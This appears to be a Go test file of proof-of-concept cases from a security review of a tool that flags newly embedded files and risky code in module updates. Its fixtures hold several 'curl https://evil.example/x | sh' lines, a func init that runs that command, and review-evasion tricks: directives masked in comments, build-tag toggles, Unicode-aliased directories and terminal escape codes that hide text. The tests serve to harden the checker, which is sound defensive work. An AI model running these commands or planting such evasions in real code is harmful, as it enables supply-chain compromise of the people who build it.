package gomod

import (
	"slices"
	"strings"
	"testing"
)

// Round 10 PoCs (security review of 2d258a1).

const r10Bin = "\x7fELF\x02\x01\x01\x00" + "\x00EVIL\x00EVIL\x00EVIL\x00EVIL"

func r10NoPerson(t *testing.T, h *report) {
	t.Helper()
	t.Logf("codes %v\nflagged %v\nincomplete %v\nhuman %v", h.codes(), h.flagged("m"), h.items(codeIncomplete), r9Human(h))
}

// A: embed.go takes the old file's patterns from every line that starts
// with //go:embed, but cmd/go only acts on real directives. A line inside
// a raw string (or a block comment, or a //go:build ignore file) in the
// old version counts as "the old tree embedded tool.bin", so the real
// directive in the new version is not new and the unchanged binary is
// never flagged.
func TestR10OldRawStringMasksEmbed(t *testing.T) {
	old := "package p\n\nimport _ \"embed\"\n\n// Usage is the help text.\nvar Usage = `\n//go:embed tool.bin\n`\n\nvar Tool []byte\n"
	cur := "package p\n\nimport _ \"embed\"\n\n//go:embed tool.bin\nvar Tool []byte\n"
	o := writeTree(t, map[string]string{"p.go": old, "tool.bin": r10Bin})
	c := writeTree(t, map[string]string{"p.go": cur, "tool.bin": r10Bin})
	h := CheckTrees(o, c)
	r10NoPerson(t, h)
	wantPerson(t, h, "tool.bin")
}

func TestR10BuildIgnoreToggle(t *testing.T) {
	body := "package p\n\nimport _ \"embed\"\n\n//go:embed tool.bin\nvar Tool []byte\n"
	o := writeTree(t, map[string]string{"p.go": "package p\n", "e.go": "//go:build ignore\n\n" + body, "tool.bin": r10Bin})
	c := writeTree(t, map[string]string{"p.go": "package p\n", "e.go": body, "tool.bin": r10Bin})
	h := CheckTrees(o, c)
	r10NoPerson(t, h)
	wantPerson(t, h, "tool.bin")
}

// A': same masking for text: an unchanged text file newly embedded is
// not quoted (the N4 fix), via an old block comment.
func TestR10OldCommentMasksText(t *testing.T) {
	old := "package p\n\nimport _ \"embed\"\n\n/*\n//go:embed script.sh\n*/\nvar Script string\n"
	cur := "package p\n\nimport _ \"embed\"\n\n//go:embed script.sh\nvar Script string\n"
	sh := "#!/bin/sh\ncurl https://evil.example/x | sh\n"
	o := writeTree(t, map[string]string{"p.go": old, "script.sh": sh})
	c := writeTree(t, map[string]string{"p.go": cur, "script.sh": sh})
	h := CheckTrees(o, c)
	r10NoPerson(t, h)
	if _, ok := h.files["script.sh"]; !ok {
		t.Errorf("script.sh is newly embedded but its text is not quoted; files quoted: %v", keys(h.files))
	}
}

func keys(m map[string]*quotedFile) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	slices.Sort(out)
	return out
}

// B: ASCII embedding dir, Unicode-aliased DATA dir. x/mod/zip accepts
// config/ and conﬁg/ (SimpleFold), APFS merges them. The new pattern
// testdata/*.dat in config/ resolves on Linux to config/testdata/a.dat
// (text, quoted: review); on macOS the merged directory also holds b.dat,
// which the gate never flags (testdata binary, not "embedded").
// Run on Linux.
func TestR10LigatureDataDir(t *testing.T) {
	old := map[string]string{"go.mod": "module m\n", "config/p.go": "package config\n"}
	cur := map[string]string{
		"go.mod":                "module m\n",
		"config/p.go":           "package config\n\nimport \"embed\"\n\n//go:embed testdata/*.dat\nvar FS embed.FS\n",
		"config/testdata/a.dat": "plain fixture\n",
		"conﬁg/testdata/b.dat":  r10Bin,
	}
	c := writeTree(t, cur)
	if !slices.Contains(c.Files, "con\ufb01g/testdata/b.dat") {
		t.Skipf("host file system merged the directories (%v); run on Linux", c.Files)
	}
	h := CheckTrees(writeTree(t, old), c)
	r10NoPerson(t, h)
	if !r9Human(h) {
		t.Errorf("no person: conﬁg/testdata/b.dat is embedded on macOS; context:\n%s", strings.Join(flat(h.ctx[codeEmbed]), ""))
	}
}

// B2: two-release form with the binary unchanged (v1 adds it under the
// aliased testdata/, unreachable; v2 adds the pattern).
func TestR10LigatureDataDirUnchanged(t *testing.T) {
	v1 := map[string]string{"go.mod": "module m\n", "config/p.go": "package config\n", "config/testdata/a.dat": "plain fixture\n", "conﬁg/testdata/b.dat": r10Bin}
	v2 := map[string]string{
		"go.mod":                "module m\n",
		"config/p.go":           "package config\n\nimport \"embed\"\n\n//go:embed testdata/*.dat\nvar FS embed.FS\n",
		"config/testdata/a.dat": "plain fixture\n",
		"conﬁg/testdata/b.dat":  r10Bin,
	}
	c := writeTree(t, v2)
	if !slices.Contains(c.Files, "con\ufb01g/testdata/b.dat") {
		t.Skipf("host file system merged the directories (%v); run on Linux", c.Files)
	}
	h := CheckTrees(writeTree(t, v1), c)
	r10NoPerson(t, h)
	if !r9Human(h) {
		t.Errorf("no person: unchanged conﬁg/testdata/b.dat newly embedded on macOS")
	}
}

func flat(m map[string][]string) []string {
	var out []string
	for _, v := range m {
		out = append(out, v...)
	}
	return out
}

// C (pre-existing on main too): un-constraining a pre-staged file. The
// old e.go is //go:build ignore (never compiled); the new one only drops
// that line. Its init and os/exec import compare equal to the old text.
func TestR10BuildIgnoreInit(t *testing.T) {
	body := "package p\n\nimport \"os/exec\"\n\nfunc init() { exec.Command(\"sh\", \"-c\", \"curl -s https://evil.example/x | sh\").Run() }\n"
	o := writeTree(t, map[string]string{"p.go": "package p\n", "e.go": "//go:build ignore\n\n" + body})
	c := writeTree(t, map[string]string{"p.go": "package p\n", "e.go": body})
	h := CheckTrees(o, c)
	r10NoPerson(t, h)
	if len(h.codes()) == 0 {
		t.Errorf("a func init that runs a shell newly enters the build; no item flagged")
	}
}

// D: a file that is neither PlainText nor IsBinary (one ESC byte, or a C1
// control, or a few invalid UTF-8 bytes) is put in res.newly by embeds,
// but binaries' unchanged loop drops every file that is not
// isBinaryFile. Unchanged, newly embedded: neither quoted nor flagged.
func TestR10GapFileNewlyEmbedded(t *testing.T) {
	sh := "#!/bin/sh\n# \x1b[8mhidden\x1b[0m\ncurl -s https://evil.example/x | sh\n"
	for name, data := range map[string]string{"esc": sh, "c1": "#!/bin/sh\n# \u0085\ncurl -s https://evil.example/x | sh\n", "badutf8": "#!/bin/sh\n# \xff\ncurl -s https://evil.example/x | sh\n"} {
		t.Run(name, func(t *testing.T) {
			emb := "package p\n\nimport (\n\t_ \"embed\"\n\t\"os/exec\"\n)\n\n//go:embed setup.sh\nvar setup string\n\nfunc Setup() error { return exec.Command(\"sh\", \"-c\", setup).Run() }\n"
			o := writeTree(t, map[string]string{"p.go": "package p\n", "setup.sh": data})
			c := writeTree(t, map[string]string{"p.go": "package p\n", "e.go": emb, "setup.sh": data})
			h := CheckTrees(o, c)
			r10NoPerson(t, h)
			_, quoted := h.files["setup.sh"]
			if !quoted && !r9Human(h) {
				t.Errorf("setup.sh newly embedded: not quoted (files %v) and no person", keys(h.files))
			}
		})
	}
}

// D2: D without the risky import: the lone go-embed item is complete.
func TestR10GapFileAlone(t *testing.T) {
	sh := "#!/bin/sh\n# \x1b[8mhidden\x1b[0m\ncurl -s https://evil.example/x | sh\n"
	emb := "package p\n\nimport _ \"embed\"\n\n//go:embed setup.sh\nvar Setup string\n"
	h := CheckTrees(writeTree(t, map[string]string{"p.go": "package p\n", "setup.sh": sh}), writeTree(t, map[string]string{"p.go": "package p\n", "e.go": emb, "setup.sh": sh}))
	r10NoPerson(t, h)
	if _, quoted := h.files["setup.sh"]; !quoted && !r9Human(h) {
		t.Errorf("setup.sh newly embedded: not quoted and no person")
	}
}

// D3: the same drop for a newly embedded non-test .h with a NUL:
// isBinaryFile is false by extension (precondition: the file was
// passed by a person when it was added).
func TestR10GapHeaderNewlyEmbedded(t *testing.T) {
	hdr := "/* config */\n\x00\x7fELF payload\n"
	emb := "package p\n\nimport _ \"embed\"\n\n//go:embed data.h\nvar D []byte\n"
	h := CheckTrees(writeTree(t, map[string]string{"p.go": "package p\n", "data.h": hdr}), writeTree(t, map[string]string{"p.go": "package p\n", "e.go": emb, "data.h": hdr}))
	r10NoPerson(t, h)
	if _, quoted := h.files["data.h"]; !quoted && !r9Human(h) {
		t.Errorf("data.h newly embedded: not quoted and no person")
	}
}
